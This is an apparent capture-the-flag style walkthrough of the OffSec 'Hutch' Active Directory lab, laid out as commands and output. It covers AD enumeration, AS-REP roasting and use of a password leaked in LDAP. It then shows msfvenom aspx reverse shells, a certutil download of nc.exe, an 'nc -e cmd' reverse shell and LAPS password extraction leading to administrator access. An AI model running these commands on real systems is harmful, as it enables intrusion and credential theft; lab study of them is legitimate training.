### SMB
```bash
smbmap -H hutch.offsec
smbmap -H hutch.offsec -u null -p ''
smbmap -H hutch.offsec -u admin -p ''
```
nothing

### rpcclient
```bash
❯ rpcclient -U "" -N $IP
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED

rpcclient -U "admin" -N $IP
```
nothing

### DNS
nslookup nothing

```bash
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='hutch.offsec'" $IP -v
```

53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

NSE: Script Post-scanning.
Initiating NSE at 11:29
Completed NSE at 11:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
zsh: segmentation fault  nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='hutch.offsec'"

### kerbrute to build a name list
```bash
/opt/kerbrute_linux_amd64 userenum -d hutch.offsec --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```
admin@hutch.offsec

```bash
echo admin >> valid_users.txt
echo admin@hutch.offsec >> valid_users.txt
```

### ldapdomaindump
`ldapdomaindump hutch.offsec` <- fatal failed

### windapsearch GO
```bash
/opt/windapsearch-linux-amd64 -d $IP -m users --full > windapsearch_go_user_full.txt

cat windapsearch_go_user_full.txt | awk '{print $1}' | sort | uniq -c | sort -nr

cat windapsearch_go_user_full.txt | grep -i "@hutch.offsec" | awk '{print $2}' >> valid_users.txt

cat windapsearch_go_user_full.txt | grep -i "@hutch.offsec" | awk '{print $2}' | cut -d '@' -f1 >> valid_users.txt
```

### AS-REP Roasting
```bash
impacket-GetNPUsers hutch.offsec/ -dc-ip $IP -no-pass -usersfile valid_users.txt
```

### SMB again
```bash
for u in $(cat just_names.txt); do smbmap -u $u -p '' -H $IP; done
```

### rpcclient again
```bash
for u in $(cat just_names.txt); do rpcclient -U $u -N $IP; done
```

### Overlooked !!
```bash
cat windapsearch_go_user_full.txt | grep -i "pass"

decription: Password set to CrabSharkJellyfish192 at user's request. Please change on next login. <- fmcsorley

or 

ldapsearch -x -H ldap://$IP -b "DC=hutch,DC=offsec" | grep description
```

```bash
crackmapexec winrm $IP -u fmcsorley -p 'CrabSharkJellyfish192'
crackmapexec smb $IP -u fmcsorley -p 'CrabSharkJellyfish192'
```

SMB         192.168.243.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192

### SMB fmcsorley
```bash
smbmap -H hutch.offsec -u fmcsorley -p 'CrabSharkJellyfish192'
```

[+] IP: hutch.offsec:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 

##### IPC$
```bash
smbmap -H hutch.offsec -u fmcsorley -p 'CrabSharkJellyfish192' -R IPC$ --depth 10

smbget -R smb://192.168.243.122/IPC$/* -U=fmcsorley%CrabSharkJellyfish192

# smbclient failed
smbclient //192.168.243.122/IPC$ -U=fmcsorley%CrabSharkJellyfish192
smbclient \\\\192.168.243.122\\IPC$ -U=fmcsorley%CrabSharkJellyfish192
smbclient //hutch.offsec/IPC$ -U=fmcsorley%CrabSharkJellyfish192
```

##### SYSVOL
```bash
smbclient //192.168.243.122/SYSVOL -U=fmcsorley%CrabSharkJellyfish192
```
nothing interesting from SMB

### WebDav https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
##### nmap 80
http-iis-webdav-vuln: Could not determine vulnerability, since root folder is password protected
##### nikto -h $IP
+ WebDAV enabled (LOCK UNLOCK COPY PROPPATCH MKCOL PROPFIND listed as allowed)

##### cadaver is easier than DavTest or curl
```bash
❯ cadaver $IP
dav:!> open http://192.168.243.122/
Authentication required for 192.168.243.122 on server `192.168.243.122':
Username: fmcsorley
Password: 
dav:/> put just_names.txt
Uploading just_names.txt to `/just_names.txt':
Progress: [=============================>] 100.0% of 121 bytes succeeded.
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.243 LPORT=80 -f aspx -o shell.aspx
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.243 LPORT=80 -f aspx -o shell2.aspx
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.243 LPORT=9389 -f aspx -o shell3.aspx
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.243 LPORT=445 -f aspx -o shell4.aspx
```

msfvenom is not very good at aspx shell. Go with links below.
* https://jiveturkey.rocks/tactics/2021/09/21/asp-reverse-shell.html
* https://github.com/borjmz/aspx-reverse-shell

### Stable shell by nc.exe
```
certutil -urlcache -f http://192.168.49.243/nc.exe nc.exe

nc.exe -e cmd 192.168.49.243 9389
```
actually, didn't help much.

### Root ms-MCS-AdmPwd
##### credentials hunting failed as nothing
```
certutil -urlcache -f http://192.168.49.243/lazagne.exe lazagne.exe

certutil -urlcache -f http://192.168.49.243/winPEASany.exe winPEASany.exe
```

.\winPEASany.exe cmd fast > winpeas_fast

powershell.exe -command "& {Get-Content *winpeas_fast* -TotalCount 500}"
powershell.exe -command "& {Get-Content *winpeas_fast* -Head 1000}" <- 1000 is max

powershell select-string -Path c:\windows\temp\winpeas_fast -Pattern ms-Mcs-AdmPwd
powershell.exe select-string -Path c:\windows\temp\winpeas_fast -Pattern "J6QOuU"

##### Nothing but I don't want to try potato this time
After going through the system we do see that LAPS has been installed on the server. `dir c:\Program Files\Laps`.

Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the ms-Mcs-AdmPwd attribute.


```bash
/opt/windapsearch-linux-amd64 -d $IP -m users -u fmcsorley@hutch.offsec -p CrabSharkJellyfish192 --full > windapsearch_go_withcred_user_full.txt
```

##### ldapsearch as I failed using windapsearch
```bash
ldapsearch -x -H ldap://$IP -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b "DC=hutch,DC=offsec" > ldapsearch_all.txt
cat ldapsearch_all.txt | grep -i 'pwd'

or

ldapsearch -x -H ldap://$IP -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b "DC=hutch,DC=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
```

https://adsecurity.org/?tag=ms-mcs-admpwd

`evil-winrm -i $IP -u administrator -p ".Q#P8i3$+hI0Ds"`

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py hutch.offsec/administrator:'.Q#P8i3$+hI0Ds'@hutch.offsec
```